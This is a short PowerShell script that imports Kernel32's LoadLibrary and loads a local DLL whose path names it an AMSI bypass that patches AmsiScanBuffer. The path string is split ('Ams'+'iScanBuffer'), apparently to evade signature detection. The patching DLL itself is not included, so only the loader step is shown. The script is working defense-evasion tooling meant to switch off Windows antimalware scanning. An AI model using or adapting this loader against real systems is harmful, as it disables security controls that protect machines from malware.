Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class Kernel32 {
  [DllImport("Kernel32.dll", SetLastError=true, CharSet=CharSet.Ansi)]
  public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
}
'@

$AmsiHandle = [Kernel32]::LoadLibrary("C:\Users\rikoteki\Desktop\Repository\AMSIBypassDLL\Patching_Ams"+"iScanBuffer\target\debug\Patching_0000ScanBuffer.dll")
Write-Host $AmsiHandle
